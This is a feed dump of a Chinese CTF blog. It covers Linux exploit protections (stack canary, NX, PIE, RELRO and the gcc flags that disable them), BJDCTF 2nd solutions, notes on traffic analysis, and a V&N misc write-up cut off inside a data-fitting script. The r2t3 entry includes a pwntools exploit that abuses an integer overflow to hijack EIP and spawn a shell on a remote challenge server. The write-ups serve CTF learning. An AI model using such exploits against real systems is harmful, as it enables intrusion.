值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>PIE机制，在windows中被称作ASLR，即地址随机化。PIE在linux中作为内核参数存在，可在/proc/sys/kernel/randomize_va_space中找到其具体的值，0、1、2三个值代表不同的工作强度，具体如下：</p><ul><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li><li>2 - 表示在1的基础上增加栈（heap）的随机化。</li></ul><p>另外，<strong>地址随机化保护</strong>有“两个开关”，一个是系统环境下的地址随机化设置，一个是gcc编译时的地址随机化设置。</p><p>只有当系统环境下的随机化保护开启时，程序的随机化保护才会生效。</p><blockquote><p>注：gcc的随机化设置不影响程序运行时的堆栈段地址，仅影响程序本身的bss、data、text静态段地址</p></blockquote><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="设置命令"><a href="#设置命令" class="headerlink" title="设置命令"></a>设置命令</h3><ul><li>NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息</li><li>PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>BJD-2rd_Writeup(SOME)</title>
    <link href="http://xibai.xyz/2020/03/24/BJD-2rd/"/>
    <id>http://xibai.xyz/2020/03/24/BJD-2rd/</id>
    <published>2020-03-24T13:41:36.970Z</published>
    <updated>2020-03-30T08:34:54.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h3><p>解压得到图片，打开看到一串十六进制，转ASCII字符得到flag</p><h3 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h3><p>改一下png图片高度即可</p><h3 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h3><p>winhex搜索字符串，关键字<code>BJD</code></p><h3 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h3><p>winhex查看文件数据发现是avi类型的数据，打开发现里面放有二维码，拖进pr扫码，得到一串十六进制ASCII码，解码得到一串字符，该字符顺序明显不是原flag顺序，不过根据题目描述可以猜出二维码内容的排序</p><h3 id="BJDCTF-2nd-Real-EasyBaBa"><a href="#BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]Real_EasyBaBa"></a>[BJDCTF 2nd]Real_EasyBaBa</h3><p>winhex发现文件末尾存在zip包，直接解压缩会报错，文件头附近会有包内的路径信息，所以直接搜索hint定位文件头，发现文件头被破坏了，修复一下拿到hint，打开发现是一个二维码，用手机晃动扫码（可以直接产生模糊效果，能省掉电脑PS的时间2333），得到一串命令，直接去kali里面对这个图片复制命令操作，发现：<br><img src="http://lychee.xibai.xyz/uploads/big/34e6bcf7c2f2910d657c9ed34abbe7f7.png" alt="rezbb"></p><h3 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h3><p>图片备注是解密后得到<code>key</code>，提示说正确的key没有最后的<code>com</code>，然后用outguess解密，key为密钥，得到flag</p><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>虽然我曾说shell是最垃圾的语言，然而此刻还是，真香！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">flag=1</span><br><span class="line">while (($flag==1))</span><br><span class="line">do</span><br><span class="line">  file1=`ls | grep tar.gz`</span><br><span class="line">  if [ $&#123;file1:0-6&#125; == 'tar.gz' ]</span><br><span class="line">  then</span><br><span class="line">    unzip -P $&#123;file1::0-7&#125; $file1</span><br><span class="line">    rm $file1</span><br><span class="line">  else</span><br><span class="line">    cat $file1</span><br><span class="line">    flag=$flag+1</span><br><span class="line">  fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-Imagin-开场曲"><a href="#BJDCTF-2nd-Imagin-开场曲" class="headerlink" title="[BJDCTF 2nd]Imagin - 开场曲"></a>[BJDCTF 2nd]Imagin - 开场曲</h3><p>有一说一，再次体验到被针对的感觉，就是去mikutap人耳判断每个按键触发的声音和音频里的声音吻合度来判断按键。这里我的 <kbd>5</kbd> 对应的那个音是其他人 <kbd>1</kbd> 对应的音，心态炸裂。flag{mikutap3313313}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h3><p>base64解码</p><h3 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h3><p>查这几个生僻字读音可得：flag{这就是flag直接交了吧}<br>即：读音为大括号的生僻字中间的生僻字就是flag</p><h3 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h3><p>发现每一行有八只猫咪，总共十行，而且总共只有两种猫咪，所以将其转换为十个二进制ASCII码，再转成字符即可</p><h3 id="BJDCTF-2nd-灵能精通-y1ng"><a href="#BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[BJDCTF 2nd]灵能精通-y1ng"></a>[BJDCTF 2nd]灵能精通-y1ng</h3><p>圣堂武士密码，猪圈密码变种</p><h3 id="BJDCTF-2nd-燕言燕语-y1ng"><a href="#BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[BJDCTF 2nd]燕言燕语-y1ng"></a>[BJDCTF 2nd]燕言燕语-y1ng</h3><p>十六进制转字符得到：yanzi ZJQ{xilzv_iqssuhoc_suzjg}<br>明显是维吉尼亚密码，yanzi 是 key，解密一下得到 flag<br>BJD{yanzi_jiushige_shabi}</p><h3 id="BJDCTF-2nd-Y1nglish-y1ng"><a href="#BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="[BJDCTF 2nd]Y1nglish-y1ng"></a>[BJDCTF 2nd]Y1nglish-y1ng</h3><p>quipquip在线解密嘿嘿嘿，最后的flag修一下错误单词即可</p><h3 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="[BJDCTF 2nd]rsa0"></a>[BJDCTF 2nd]rsa0</h3><h3 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="[BJDCTF 2nd]rsa1"></a>[BJDCTF 2nd]rsa1</h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h3><p>简单的整数溢出<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162304.png" alt="20200330162304"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162326.png" alt="20200330162326"><br>可以输入<code>0x400</code>bytes的数据，但是会用<code>strlen</code>函数获取输入长度，要求长度大于3小于9，而覆盖<code>ret</code>的返回地址需要总共<code>0x19</code>bytes的数据。这时候注意<code>v3</code>是一个<code>int8</code>类型的无符号变量，也就是<code>v3</code>最大也只能是<code>255</code>，超过<code>255</code>的话相当于做了一次<code>%255</code>的运算。也就是我们可以通过输入大于<code>0x103</code>小于<code>0x109</code>bytes的数据来绕过if判断，从而成功劫持<code>EIP</code>。又发现程序内置了<code>system(&quot;/bin/sh&quot;)</code>函数，直接调用即可。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./r2t3")</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27348</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"a"</span>*<span class="number">0x15</span>+p32(<span class="number">0x08048594</span>)+<span class="string">'a'</span>*(<span class="number">0x105</span><span class="number">-0x19</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h3><h3 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h3><h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><h3 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="[BJDCTF 2nd]secret"></a>[BJDCTF 2nd]secret</h3><h3 id="BJDCTF-2nd-rci"><a href="#BJDCTF-2nd-rci" class="headerlink" title="[BJDCTF 2nd]rci"></a>[BJDCTF 2nd]rci</h3><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="BJDCTF-2nd-guessgame"><a href="#BJDCTF-2nd-guessgame" class="headerlink" title="[BJDCTF 2nd]guessgame"></a>[BJDCTF 2nd]guessgame</h3><p>拖进ida查找字符串即可得到flag</p><h3 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h3><p>ida查看发现一段没有用到的十六进制数据，已知的内容仅是一串明显加密了的字符串和一个死循环，很明显这串十六进制应该是做题的关键数据，使用ida的分析命令将其分析为汇编指令，发现果然是密文相关的操作。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161628.png" alt="20200330161628"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161858.png" alt="20200330161858"><br>写出脚本解得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag_encode = <span class="string">"]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_encode:</span><br><span class="line">  flag += chr(ord(i)^<span class="number">0x1f</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-diff2"><a href="#BJDCTF-2nd-diff2" class="headerlink" title="[BJDCTF 2nd]diff2"></a>[BJDCTF 2nd]diff2</h3>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="CTF-Writeup" scheme="http://xibai.xyz/categories/CTF-Writeup/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>流量分析（萌新开坑Ing-慢慢填）</title>
    <link href="http://xibai.xyz/2020/03/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://xibai.xyz/2020/03/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2020-03-05T13:42:07.000Z</published>
    <updated>2020-04-09T10:31:35.225Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>最后更新于：2020-03-05 21：44</em></strong></p><h2 id="萌新已知的工具"><a href="#萌新已知的工具" class="headerlink" title="萌新已知的工具"></a>萌新已知的工具</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h3 id="usbpacp"><a href="#usbpacp" class="headerlink" title="usbpacp"></a>usbpacp</h3><h3 id="npcap"><a href="#npcap" class="headerlink" title="npcap"></a>npcap</h3><h3 id="RouterPassView-能查看宽带数据"><a href="#RouterPassView-能查看宽带数据" class="headerlink" title="RouterPassView(能查看宽带数据)"></a>RouterPassView(能查看宽带数据)</h3><h2 id="目前见过的类型"><a href="#目前见过的类型" class="headerlink" title="目前见过的类型"></a>目前见过的类型</h2><h3 id="常规网络流量包分析"><a href="#常规网络流量包分析" class="headerlink" title="常规网络流量包分析"></a>常规网络流量包分析</h3><h3 id="USB流量包分析"><a href="#USB流量包分析" class="headerlink" title="USB流量包分析"></a>USB流量包分析</h3><p>这个文件里面第53页有usb键盘流量中和键盘按键对应的十六进制数据表：<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf" target="_blank" rel="noopener">https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</a></p><h3 id="网络通信流量包（voip-rtp）"><a href="#网络通信流量包（voip-rtp）" class="headerlink" title="网络通信流量包（voip rtp）"></a>网络通信流量包（voip rtp）</h3>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>2020V&amp;N招新赛Misc</title>
    <link href="http://xibai.xyz/2020/03/01/V&amp;N-find_new/"/>
    <id>http://xibai.xyz/2020/03/01/V&amp;N-find_new/</id>
    <published>2020-03-01T04:57:01.000Z</published>
    <updated>2020-03-30T04:24:18.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拉胯的三条命令"><a href="#拉胯的三条命令" class="headerlink" title="拉胯的三条命令"></a>拉胯的三条命令</h2><p>打开压缩包结合题目描述，可以猜测这是一个nmap扫描端口的流量包，然后让找到开放的端口从小到大排列。Wireshark中nmap扫描流量，如果端口开放，则必有ack回应。<br>而且wireshark对于正常通信的tcp流量貌似都是高亮显示，ok，直接查看高亮的流量，统计这些流量的端口，其中有个重要的小细节，对于80端口的流量，因为其默认类型被当作http端口，所以wireshark会直接将其高亮，要看一下他的ack值是否为零才能正确判断80端口是否开放。于是得到一下端口号：<br>21<br>22<br>631<br>801<br>3306<br>5939<br>32848<br>60206<br>其中5939、32848、60206三个端口存在大量的“流量”，这不应该是端口扫描的流量，端口扫描是探查端口状态的，不应该有大量的数据交换，所以不考虑这三个端口，剩下的端口从小到大排列试一下，正确</p><h2 id="ML第一步"><a href="#ML第一步" class="headerlink" title="ML第一步"></a>ML第一步</h2><p>创建实例后浏览器直接访问发现这不是网站服务，那应该是应用类服务，用nc连接。</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/imagesVN-ML1.png" alt="link"></p><p>总之意思就是有一个未知函数y=f(x)，给出70组(x,y)。让我们求它的拟合方程。<br>然后他会给出10个x，让我们用拟合方程推测y的值，如果结果误差不超过0.06，就可以得到小旗子。<br>用python的matplotlib.pyplot画出散点图发现70组数据接近一条直线，直接脚本求解线性回归方程，然后去拿flag。求解脚本如下（ps：因为散点图的这条线有一点点弧度，所以我用了四次多项式，没有直接用一次的直线）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_fit</span><span class="params">(x,y_fit)</span>:</span></span><br><span class="line">    a,b,c,d,e=y_fit.tolist()</span><br><span class="line">    <span class="keyword">return</span> a*x**<span class="number">4</span>+b*x**<span class="number">3</span>+c*x**<span class="number">2</span>+d*x+e</span><br><span class="line"></span><br><span class="line">data = <span class="string">"x=0.7587857855539164,y=-1.720845811051089\</span></span><br><span class="line"><span class="string">;x=0.13291321567620085,y=-0.44979144628012097\</span></span><br><span class="line"><span class="string">;x=0.989974986143239,y=-1.9690360825859337\</span></span><br><span class="line"><span class="string">;x=0.3576179200089157,y=-0.9003680552893811\</span></span><br><span class="line"><span class="string">;x=0.6031957139605361,y=-1.413869207317482\</span></span><br><span class="line"><span class="string">;x=0.8655969454196368,y=-1.8874775800952617\</span></span><br><span class="line"><span class="string">;x=0.48683649837550014,y=-1.2221034522056922\</span></span><br><span class="line"><span class="string">;x=0.1279800851084858,y=-0.3598626690513456\</span></span><br><span class="line"><span class="string">;x=0.01840117269743846,y=-0.0825695560842738\</span></span><br><span class="line"><span class="string">;x=0.49065439417804224,y=-1.2151317607134124\</span></span><br><span class="line"><span class="string">;x=0.745683162567403,y=-1.6542547149837732\</span></span><br><span class="line"><span class="string">;x=0.564686557840641,y=-1.4086742079578898\</span></span><br><span class="line"><span class="string">;x=0.5506578263400632,y=-1.328319038372737\</span></span><br><span class="line"><span class="string">;x=0.09890521425587329,y=-0.268867793932863\</span></span><br><span class="line"><span class="string">;x=0.9653080707668127,y=-1.9926065934683845\</span></span><br><span class="line"><span class="string">;x=0.49189934250857936,y=-1.2041799438406553\</span></span><br><span class="line"><span class="string">;x=0.47460948035678996,y=-1.1919570601329146\</span></span><br><span class="line"><span class="string">;x=0.7296637598789997,y=-1.626555486935713\</span></span><br><span class="line"><span class="string">;x=0.8772637406893159,y=-1.8444895108368027\</span></span><br><span class="line"><span class="string">;x=0.5262847068436897,y=-1.26898790243642\</span></span><br><span class="line"><span class="string">;x=0.18375224095950315,y=-0.49792227912640824\</span></span><br><span class="line"><span class="string">;x=0.5302276810137457,y=-1.3245875742508557\</span></span><br><span class="line"><span class="string">;x=0.44598041870724514,y=-1.1407183813974087\</span></span><br><span class="line"><span class="string">;x=0.9297802591112221,y=-1.9038682460892118\</span></span><br><span class="line"><span class="string">;x=0.31768338032416477,y=-0.8380436760373051\</span></span><br><span class="line"><span class="string">;x=0.31932181828715034,y=-0.885221801261295\</span></span><br><span class="line"><span class="string">;x=0.6520599635229203,y=-1.5648743849645852\</span></span><br><span class="line"><span class="string">;x=0.6318704181747703,y=-1.5361822819084332\</span></span><br><span class="line"><span class="string">;x=0.33596049748295764,y=-0.9018941515966336\</span></span><br><span class="line"><span class="string">;x=0.1582929490762487,y=-0.4621575450764881\</span></span><br><span class="line"><span class="string">;x=0.611161054351204,y=-1.4819230001079216\</span></span><br><span class="line"><span class="string">;x=0.2273505730886458,y=-0.6426008674876235\</span></span><br><span class="line"><span class="string">;x=0.3434775350774453,y=-0.9440612715950338\</span></span><br><span class="line"><span class="string">;x=0.3424015864156754,y=-0.8739934996421624\</span></span><br><span class="line"><span class="string">;x=0.8593474128108042,y=-1.8415838175212416\</span></span><br><span class="line"><span class="string">;x=0.9385785550053852,y=-1.9041364608079328\</span></span><br><span class="line"><span class="string">;x=0.4943478784921591,y=-1.2315495557049194\</span></span><br><span class="line"><span class="string">;x=0.45739416734634764,y=-1.1594371513265878\</span></span><br><span class="line"><span class="string">;x=0.8929294113779981,y=-1.8615545670417983\</span></span><br><span class="line"><span class="string">;x=0.19881908699665485,y=-0.5530975791426536\</span></span><br><span class="line"><span class="string">;x=0.06396527084952186,y=-0.2248085775384525\</span></span><br><span class="line"><span class="string">;x=0.2686482544684099,y=-0.75603686845716\</span></span><br><span class="line"><span class="string">;x=0.6084930406339851,y=-1.4717769288575426\</span></span><br><span class="line"><span class="string">;x=0.22216290869419308,y=-0.5906772203093745\</span></span><br><span class="line"><span class="string">;x=0.5914604953995254,y=-1.4177038761692764\</span></span><br><span class="line"><span class="string">;x=0.2036532638797327,y=-0.5788918140417649\</span></span><br><span class="line"><span class="string">;x=0.4558490044828919,y=-1.1682771304121138\</span></span><br><span class="line"><span class="string">;x=0.18324091786354268,y=-0.5788763881712895\</span></span><br><span class="line"><span class="string">;x=0.5421407829934451,y=-1.328797280920123\</span></span><br><span class="line"><span class="string">;x=0.4056810838054147,y=-1.0890377739166588\</span></span><br><span class="line"><span class="string">;x=0.39311134509953427,y=-1.037818315593108\</span></span><br><span class="line"><span class="string">;x=0.452612604644542,y=-1.2237566644854736\</span></span><br><span class="line"><span class="string">;x=0.2615352628059312,y=-0.70346972932896\</span></span><br><span class="line"><span class="string">;x=0.8901625763679877,y=-1.8806707950314019\</span></span><br><span class="line"><span class="string">;x=0.28280744763980337,y=-0.8231345793908345\</span></span><br><span class="line"><span class="string">;x=0.09628463850897795,y=-0.24971993270496043\</span></span><br><span class="line"><span class="string">;x=0.16481384396642307,y=-0.46946630708368303\</span></span><br><span class="line"><span class="string">;x=0.2847357540218156,y=-0.7947718784607872\</span></span><br><span class="line"><span class="string">;x=0.5319011449268986,y=-1.2668856188466802\</span></span><br><span class="line"><span class="string">;x=0.1081951088228772,y=-0.2536241872065086\</span></span><br><span class="line"><span class="string">;x=0.08836473591694316,y=-0.23153637261490673\</span></span><br><span class="line"><span class="string">;x=0.38840371594123335,y=-1.0336677376652563\</span></span><br><span class="line"><span class="string">;x=0.7720822530882997,y=-1.6953637803062263\</span></span><br><span class="line"><span class="string">;x=0.36229637982212415,y=-0.9854786906183374\</span></span><br><span class="line"><span class="string">;x=0.9519976240184558,y=-1.929418000224495\</span></span><br><span class="line"><span class="string">;x=0.5783183065134814,y=-1.3777929584428186\</span></span><br><span class="line"><span 